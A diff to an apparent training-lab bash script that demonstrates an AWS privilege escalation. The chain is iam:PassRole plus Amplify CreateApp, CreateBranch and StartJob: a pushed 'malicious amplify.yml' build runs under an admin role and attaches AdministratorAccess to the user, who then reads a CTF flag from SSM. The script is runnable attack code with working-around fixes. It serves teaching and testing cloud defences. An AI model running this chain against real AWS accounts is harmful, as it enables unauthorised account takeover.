@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Demo script for iam:PassRole + amplify:CreateApp + amplify:CreateBranch + amplify:StartJob privilege escalation
 # This scenario demonstrates how a user with PassRole and Amplify permissions can escalate
@@ -24,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -108,6 +111,14 @@ use_readonly_creds() {
     unset AWS_SESSION_TOKEN
 }
 
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 export AWS_REGION=$AWS_REGION
@@ -117,7 +128,7 @@ echo "Using region: $AWS_REGION"
 
 # [EXPLOIT] Verify starting user identity
 use_starting_creds
-show_cmd "[Attacker] aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -130,7 +141,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 # [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
-show_cmd "[ReadOnly] aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -139,7 +150,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
 use_starting_creds
-show_cmd "[Attacker] aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -156,32 +167,46 @@ echo "Clone URL: $CODECOMMIT_CLONE_URL"
 # Clean up any previous clone
 rm -rf "$CLONE_DIR"
 
-# Configure git credential helper for CodeCommit
-# Save existing git config to restore later
-ORIG_GIT_CREDENTIAL_HELPER=$(git config --global credential.helper 2>/dev/null || echo "")
-ORIG_GIT_USE_HTTP_PATH=$(git config --global credential.UseHttpPath 2>/dev/null || echo "")
+# Git credential-helper config for CodeCommit.
+#
+# Pitfall: setting `credential.helper` via `git config --global` does NOT replace
+# system-level helpers (e.g. macOS `osxkeychain`, Linux libsecret) — git chains
+# them. The keychain runs first, returns stale/empty creds, and git never falls
+# through to the AWS helper, producing an opaque HTTP 403 from CodeCommit.
+#
+# Fix: pass an empty `credential.helper=` via `-c` before the codecommit one on
+# every git invocation. The empty value resets the helper chain for that command,
+# so only the codecommit helper runs. We use `-c` (not `git config --global`) so
+# the user's global gitconfig is never touched.
+GIT_CC_FLAGS=(
+    -c "credential.helper="
+    -c "credential.helper=!aws codecommit credential-helper \$@"
+    -c "credential.UseHttpPath=true"
+)
 
-git config --global credential.helper '!aws codecommit credential-helper $@'
-git config --global credential.UseHttpPath true
+echo "Configured per-invocation git credential helper for CodeCommit"
 
-echo "Configured git credential helper for CodeCommit"
-
-# Clone the repository
+# Clone the repository (with retry for IAM propagation lag — a fresh terraform apply
+# can take 20-60s before CodeCommit honors the GitPull policy on the starting user)
 echo "Cloning repository..."
-show_cmd "[Attacker] git clone $CODECOMMIT_CLONE_URL $CLONE_DIR"
-if ! git clone "$CODECOMMIT_CLONE_URL" "$CLONE_DIR" 2>&1; then
+show_cmd "Attacker" "git clone $CODECOMMIT_CLONE_URL $CLONE_DIR"
+CLONE_ATTEMPTS=0
+MAX_CLONE_ATTEMPTS=4
+CLONE_OK=0
+while [ $CLONE_ATTEMPTS -lt $MAX_CLONE_ATTEMPTS ]; do
+    rm -rf "$CLONE_DIR"
+    if git "${GIT_CC_FLAGS[@]}" clone "$CODECOMMIT_CLONE_URL" "$CLONE_DIR" 2>&1; then
+        CLONE_OK=1
+        break
+    fi
+    CLONE_ATTEMPTS=$((CLONE_ATTEMPTS + 1))
+    if [ $CLONE_ATTEMPTS -lt $MAX_CLONE_ATTEMPTS ]; then
+        echo "  Clone attempt $CLONE_ATTEMPTS/$MAX_CLONE_ATTEMPTS failed, sleeping 10s and retrying..."
+        sleep 10
+    fi
+done
+if [ $CLONE_OK -ne 1 ]; then
     echo -e "${RED}Error: Failed to clone CodeCommit repository${NC}"
-    # Restore git config
-    if [ -n "$ORIG_GIT_CREDENTIAL_HELPER" ]; then
-        git config --global credential.helper "$ORIG_GIT_CREDENTIAL_HELPER"
-    else
-        git config --global --unset credential.helper 2>/dev/null || true
-    fi
-    if [ -n "$ORIG_GIT_USE_HTTP_PATH" ]; then
-        git config --global credential.UseHttpPath "$ORIG_GIT_USE_HTTP_PATH"
-    else
-        git config --global --unset credential.UseHttpPath 2>/dev/null || true
-    fi
     exit 1
 fi
 
@@ -217,34 +242,26 @@ cat > index.html << 'HTMLEOF'
 <body><h1>Amplify Privilege Escalation Demo</h1></body></html>
 HTMLEOF
 
-# Commit and push
+# Commit and push (push needs the same credential-helper override as clone).
+# Tolerate "nothing to commit" — a prior partial demo run may have already pushed
+# the same amplify.yml/index.html, in which case the working tree is clean and the
+# malicious build spec is already in the remote main branch. Either way, push so
+# we're sure remote is up to date.
 git add -A
-git -c user.email="demo@pathfinding.labs" -c user.name="Demo User" commit -m "Add malicious amplify.yml build spec" 2>&1
-echo "Pushing malicious build spec to CodeCommit..."
-show_cmd "[Attacker] git push origin main"
-git push origin main 2>&1 || git push origin master 2>&1
-
-if [ $? -ne 0 ]; then
-    # If the repo is empty, we need to push to create the initial branch
-    git push -u origin HEAD:main 2>&1
+if git -c user.email="demo@pathfinding.labs" -c user.name="Demo User" \
+       commit -m "Add malicious amplify.yml build spec" 2>&1; then
+    echo "Created new commit with malicious build spec"
+else
+    echo "Working tree clean — malicious build spec already present from prior run"
 fi
+echo "Pushing malicious build spec to CodeCommit..."
+show_cmd "Attacker" "git push -u origin HEAD:main"
+git "${GIT_CC_FLAGS[@]}" push -u origin HEAD:main 2>&1 || true
 
 echo -e "${GREEN}✓ Malicious amplify.yml pushed to CodeCommit repository${NC}\n"
 
-# Return to scenario directory
+# Return to scenario directory (per-invocation `-c` flags mean no global config to restore)
 cd - > /dev/null
-
-# Restore git credential helper config
-if [ -n "$ORIG_GIT_CREDENTIAL_HELPER" ]; then
-    git config --global credential.helper "$ORIG_GIT_CREDENTIAL_HELPER"
-else
-    git config --global --unset credential.helper 2>/dev/null || true
-fi
-if [ -n "$ORIG_GIT_USE_HTTP_PATH" ]; then
-    git config --global credential.UseHttpPath "$ORIG_GIT_USE_HTTP_PATH"
-else
-    git config --global --unset credential.UseHttpPath 2>/dev/null || true
-fi
 
 # [EXPLOIT] Step 6: Create Amplify app with admin service role (PassRole)
 use_starting_creds
@@ -254,21 +271,27 @@ echo "App name: $APP_NAME"
 echo "Repository: $CODECOMMIT_CLONE_URL"
 echo "Service role: $ADMIN_ROLE_ARN"
 
-show_attack_cmd "[Attacker] aws amplify create-app --name $APP_NAME --repository $CODECOMMIT_CLONE_URL --iam-service-role-arn $ADMIN_ROLE_ARN --region $AWS_REGION --output json"
+# Pitfall: passing --repository directly triggers an AWS CLI v2 client-side preflight
+# (HTTP GET against the repo URL) that ignores the codecommit credential-helper and
+# returns 401, blocking the request before it reaches Amplify. Workaround: pass the
+# parameters via --cli-input-json which skips the preflight URL probe.
+CREATE_APP_INPUT=$(jq -nc \
+    --arg name "$APP_NAME" \
+    --arg repo "$CODECOMMIT_CLONE_URL" \
+    --arg role "$ADMIN_ROLE_ARN" \
+    '{name: $name, repository: $repo, iamServiceRoleArn: $role}')
+show_attack_cmd "Attacker" "aws amplify create-app --cli-input-json '$CREATE_APP_INPUT' --region $AWS_REGION --output json"
 APP_RESULT=$(aws amplify create-app \
-    --name "$APP_NAME" \
-    --repository "$CODECOMMIT_CLONE_URL" \
-    --iam-service-role-arn "$ADMIN_ROLE_ARN" \
-    --region $AWS_REGION \
+    --cli-input-json "$CREATE_APP_INPUT" \
+    --region "$AWS_REGION" \
     --output json)
 
-if [ $? -ne 0 ]; then
+APP_ID=$(echo "$APP_RESULT" | jq -r '.app.appId')
+if [ -z "$APP_ID" ] || [ "$APP_ID" = "null" ]; then
     echo -e "${RED}Error: Failed to create Amplify app${NC}"
-    rm -rf "$CLONE_DIR"
     exit 1
 fi
 
-APP_ID=$(echo "$APP_RESULT" | jq -r '.app.appId')
 echo "Amplify App ID: $APP_ID"
 echo -e "${GREEN}✓ Amplify app created with admin service role${NC}\n"
 
@@ -277,18 +300,12 @@ use_starting_creds
 echo -e "${YELLOW}Step 7: Creating branch for Amplify app${NC}"
 echo "Branch: main"
 
-show_attack_cmd "[Attacker] aws amplify create-branch --app-id $APP_ID --branch-name main --region $AWS_REGION --output json"
-BRANCH_RESULT=$(aws amplify create-branch \
+show_attack_cmd "Attacker" "aws amplify create-branch --app-id $APP_ID --branch-name main --region $AWS_REGION --output json"
+aws amplify create-branch \
     --app-id "$APP_ID" \
     --branch-name main \
-    --region $AWS_REGION \
-    --output json)
-
-if [ $? -ne 0 ]; then
-    echo -e "${RED}Error: Failed to create branch${NC}"
-    rm -rf "$CLONE_DIR"
-    exit 1
-fi
+    --region "$AWS_REGION" \
+    --output json > /dev/null
 
 echo -e "${GREEN}✓ Branch 'main' created${NC}\n"
 
@@ -298,21 +315,20 @@ echo -e "${YELLOW}Step 8: Starting Amplify build job${NC}"
 echo "This triggers the build which executes the malicious amplify.yml commands"
 echo "using the admin service role's credentials."
 
-show_attack_cmd "[Attacker] aws amplify start-job --app-id $APP_ID --branch-name main --job-type RELEASE --region $AWS_REGION --output json"
+show_attack_cmd "Attacker" "aws amplify start-job --app-id $APP_ID --branch-name main --job-type RELEASE --region $AWS_REGION --output json"
 JOB_RESULT=$(aws amplify start-job \
     --app-id "$APP_ID" \
     --branch-name main \
     --job-type RELEASE \
-    --region $AWS_REGION \
+    --region "$AWS_REGION" \
     --output json)
 
-if [ $? -ne 0 ]; then
+JOB_ID=$(echo "$JOB_RESULT" | jq -r '.jobSummary.jobId')
+if [ -z "$JOB_ID" ] || [ "$JOB_ID" = "null" ]; then
     echo -e "${RED}Error: Failed to start build job${NC}"
-    rm -rf "$CLONE_DIR"
     exit 1
 fi
 
-JOB_ID=$(echo "$JOB_RESULT" | jq -r '.jobSummary.jobId')
 echo "Job ID: $JOB_ID"
 echo -e "${GREEN}✓ Build job started${NC}\n"
 
@@ -329,12 +345,12 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
     MINUTES_ELAPSED=$((ELAPSED / 60))
     SECONDS_REMAINING=$((ELAPSED % 60))
 
-    show_cmd "[ReadOnly] aws amplify get-job --app-id $APP_ID --branch-name main --job-id $JOB_ID --region $AWS_REGION --query 'job.summary.status' --output text"
+    show_cmd "ReadOnly" "aws amplify get-job --app-id $APP_ID --branch-name main --job-id $JOB_ID --region $AWS_REGION --query 'job.summary.status' --output text"
     JOB_STATUS=$(aws amplify get-job \
         --app-id "$APP_ID" \
         --branch-name main \
         --job-id "$JOB_ID" \
-        --region $AWS_REGION \
+        --region "$AWS_REGION" \
         --query 'job.summary.status' \
         --output text)
 
@@ -374,7 +390,7 @@ echo "Waiting 15 seconds for IAM policy to propagate..."
 sleep 15
 
 # Check if AdministratorAccess was attached
-show_cmd "[ReadOnly] aws iam list-attached-user-policies --user-name $STARTING_USER --output json"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output json"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
     --user-name "$STARTING_USER" \
     --output json)
@@ -395,7 +411,7 @@ echo ""
 # [OBSERVATION] Prove admin access by listing IAM users
 use_readonly_creds
 echo "Attempting to list IAM users..."
-show_cmd "[ReadOnly] aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -409,9 +425,29 @@ echo ""
 # Clean up temporary files
 rm -rf "$CLONE_DIR"
 
-# Final summary
+# [EXPLOIT]
+# Step 11: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/amplify-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, amplify:CreateApp, amplify:CreateBranch, amplify:StartJob)"
@@ -420,12 +456,14 @@ echo "3. Created Amplify app connected to repo, passing admin role via iam:PassR
 echo "4. Created branch and started build job"
 echo "5. Amplify build executed with admin role credentials, attached AdministratorAccess to starting user"
 echo "6. Achieved: Administrator Access"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (git push malicious amplify.yml to CodeCommit)"
 echo "  → (iam:PassRole + amplify:CreateApp) → App with $ADMIN_ROLE_NAME"
 echo "  → (amplify:CreateBranch + amplify:StartJob) → Build executes as admin"
 echo "  → (iam:AttachUserPolicy in build) → Admin"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
